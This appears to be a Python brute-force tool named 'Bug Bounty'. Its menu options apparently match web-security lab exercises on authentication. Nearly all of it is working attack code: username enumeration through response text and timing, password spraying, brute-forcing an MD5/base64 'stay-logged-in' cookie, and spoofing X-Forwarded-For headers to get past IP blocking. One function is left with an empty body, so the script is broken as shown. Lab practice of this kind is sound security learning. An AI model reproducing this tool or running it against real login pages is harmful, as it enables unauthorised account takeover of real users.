import requests
import time
import random
import base64
import hashlib

def bug_bundy():
    print("\n")
    print(" ██████  ██    ██  ██████      ██████   ██████  ██    ██ ███    ██ ████████ ██    ██ ")
    print(" ██   ██ ██    ██ ██           ██   ██ ██    ██ ██    ██ ████   ██    ██     ██  ██  ")
    print(" ██████  ██    ██ ██   ███     ██████  ██    ██ ██    ██ ██ ██  ██    ██      ████   ")
    print(" ██   ██ ██    ██ ██    ██     ██   ██ ██    ██ ██    ██ ██  ██ ██    ██       ██    ")
    print(" ██████   ██████   ██████      ██████   ██████   ██████  ██   ████    ██       ██    ")
    print("\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t by Tom Thomas")
    print("\n")

def bruteforce_via_different_responses(usernames, passwords, url):
    username = None
    for i in usernames:
        data2 = {
            "username": i,
            "password": "admin"
        }
        r = requests.post(url, data=data2)
        if "Invalid username" not in r.text:
            print("User found {}".format(i))
            username = i
            break

    if username:
        for i in passwords:
            data2 = {
                "username": username,
                "password": i
            }
            r = requests.post(url, data=data2)
            if "Incorrect password" not in r.text:
                print("Password found {} for the user {}".format(i, username))
                break

def bruteforce_subtly_different_responses(usernames, passwords, url):
    for i in usernames:
        for j in passwords:
            data2 = {
                "username": i,
                "password": j
            }
            r = requests.post(url, data=data2)
            if "Invalid username or password" not in r.text:
                print("Password found {}:{}".format(i, j))
                return

def bruteforce_response_timing(usernames, passwords, url):
    header2 = {"X-Forwarded-For": "127.{}.{}.{}".format(random.randint(1, 255), random.randint(1, 255), random.randint(1, 255))}
    user = input("Enter a valid username: ")
    passw = input("Enter a valid password: ")
    data2 = {
        "username": user,
        "password": passw
    }
    t1 = time.perf_counter()
    r = requests.post(url, data=data2)
    t2 = time.perf_counter()
    print("Time taken for real user is {}".format(t2 - t1))

    for i in usernames:
        for j in passwords:
            header2["X-Forwarded-For"] = "127.{}.{}.{}".format(random.randint(1, 255), random.randint(1, 255), random.randint(1, 255))
            data2 = {
                "username": i,
                "password": j
            }
            t3 = time.perf_counter()
            r = requests.post(url, data=data2,headers=header2)
            t4 = time.perf_counter()
            if (t4 - t3 >= (t2 - t1) - .2):
                print("Check these {}:{} and time taken {}".format(i, j, t4 - t3))

def bruteforce_stay_logged_in_cookieg(usernames, passwords, url):
    for i in passwords:
        hashvalue = hashlib.md5(i.encode()).hexdigest()
        hashvalue = "carlos:"+hashvalue
        Cookievalue = base64.b64encode(hashvalue.encode())  # Encode to base64
        cookies={
            "stay-logged-in":Cookievalue.decode()
                }
        r = requests.get(url, cookies=cookies)
        if "carlos" in r.text:
            print("found {}".format(i))
            break
        else:
            print("trying {}".format(i))
def bruteforce_IP_block(passwords, url):
    username=input("Enter a vaild username ")
    username2=input("Enter a vaild username2 not for brute force ")
    password2=input("Enter a vaild password for {} ".format(username2))
    counter=0
    for i in passwords:
        if counter==2:
            data2 = {
                "username": username2,
                "password": password2
            }
            header2={"X-Forwarded-For":"127.{}.{}.{}".format(random.randint(1, 255), random.randint(1, 255), random.randint(1, 255))}
            r = requests.post(url, data=data2, headers=header2)
            counter=0
        data2 = {
            "username": username,
            "password": i
        }
        header2={"X-Forwarded-For":"127.{}.{}.{}".format(random.randint(1, 255), random.randint(1, 255),random.randint(1, 255))}
        r = requests.post(url, data=data2, headers=header2)
        counter+=1
        if "Incorrect password" not in r.text:
            print("Password found {} for the user {}".format(i, username))
            break
def bruteforce_account_lock(passwords, url):
    

def main():
    bug_bundy()
    with open("username.txt") as fb:
        usernames = fb.read().splitlines()

    with open("password.txt") as fb:
        passwords = fb.read().splitlines()
    while True:
        print("Options:")
        print("1. Username enumeration via different responses")
        print("2. Username enumeration via subtly different responses")
        print("3. Username enumeration via response timing")
        print("4. Brute-forcing a stay-logged-in cookie")
        print("5. Broken brute-force protection, IP block")
        print("6. Username enumeration via account lock")
        option = int(input("Select an option: "))
        url = input("Enter a URL: ")

        if option == 1:
            bruteforce_via_different_responses(usernames, passwords, url)
        elif option == 2:
            bruteforce_subtly_different_responses(usernames, passwords, url)
        elif option == 3:
            bruteforce_response_timing(usernames, passwords, url)
        elif option == 4:
            bruteforce_stay_logged_in_cookieg(usernames, passwords, url)
        elif option == 5:
            bruteforce_IP_block(passwords, url)


        cts = input("Do you want to continue (y/n)? ").lower()
        if cts == 'n':
            break

if __name__ == "__main__":
    main()